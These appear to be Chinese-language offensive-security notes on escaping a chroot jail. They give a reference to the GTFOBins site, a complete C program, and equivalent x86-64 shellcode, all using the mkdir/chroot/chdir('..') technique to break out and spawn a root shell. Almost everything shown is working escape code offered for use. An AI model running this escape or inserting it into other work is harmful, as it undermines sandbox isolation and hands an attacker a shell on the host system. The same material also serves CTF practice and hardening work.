## GTFOBins

https://gtfobins.github.io/ 

如果可以执行任意 binary 的话，查阅这个项目可以比较方便的逃逸

## Chroot Escapes

### Root + CWD

要求：

1. 在 chroot 环境中拥有 root 权限

```c
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>

int main(int argc, char *argv[])
{
    int ret;

    ret = mkdir("escape", 0755);
    if (ret < 0)
        perror("mkdir");

    ret = chroot("escape");
    if (ret < 0)
        perror("chroot");

    for (int i = 0; i < 1000; i++) {
        ret = chdir("..");
        if (ret < 0)
            perror("chdir");
    }

    ret = chroot(".");
    if (ret < 0)
        perror("chroot");

    ret = execl("/bin/bash", "/bin/bash", NULL);
    if (ret < 0)
        perror("execve");

    sleep(100);

    return 0;
}
```

```python
escape_shellcode = f"""
_start:
    /* 1. mkdir("esc", 0755) */
    /* 栈上构造 "esc\0" */
    xor rax, rax
    push rax            /* null terminator */
    mov rax, 0x637365   /* "esc" */
    push rax
    
    mov rdi, rsp        /* arg1: filename */
    mov rsi, 0x1ed      /* arg2: mode 0755 */
    mov rax, 83         /* SYS_mkdir */
    syscall
    
    /* 注意：如果目录已存在 mkdir 返回 -1，但不影响后续 chroot，所以不检查返回值 */

    /* 2. chroot("esc") */
    /* rdi 依然指向 "esc" (如果没有被 mkdir 修改)，但为了保险重新加载 */
    mov rdi, rsp
    mov rax, 161        /* SYS_chroot */
    syscall

    /* 检查 chroot 是否成功，如果失败说明没有 root 权限，后续操作无意义 */
    test rax, rax
    js exit_process     /* 失败则退出，防止死循环 */

    /* 3. 准备 chdir("..") 的循环 */
    /* 在栈上构造 ".." */
    xor rax, rax
    mov ax, 0x2e2e      /* ".." */
    push rax
    
    /* 使用 rbx 作为计数器 (syscall 不会破坏 rbx) */
    mov rbx, 50

escape_loop:
    /* [CRITICAL FIX] 每次循环必须重新加载 rdi */
    mov rdi, rsp        /* rdi 指向栈顶的 ".." */
    mov rax, 80         /* SYS_chdir */
    syscall
    
    dec rbx
    jnz escape_loop

    /* 4. chroot(".") 锁定根目录 */
    /* 此时我们已经在真实的根目录下，执行 chroot(".") 将其设为当前进程的 root */
    /* 栈顶依然是 "..", 我们需要 "." */
    /* 修改栈顶数据为 "." (0x2e) */
    mov word ptr [rsp], 0x2e 
    
    mov rdi, rsp        /* rdi 指向 "." */
    mov rax, 161        /* SYS_chroot */
    syscall

    /* 5. Get Shell: execve("/bin/sh", 0, 0) */
    xor rdx, rdx        
    xor rsi, rsi
    
    mov rax, 0x68732f6e69622f   /* "/bin/sh" */
    push rax
    mov rdi, rsp
    
    mov rax, 59         /* SYS_execve */
    syscall

exit_process:
    mov rax, 60
    xor rdi, rdi
    syscall
"""
```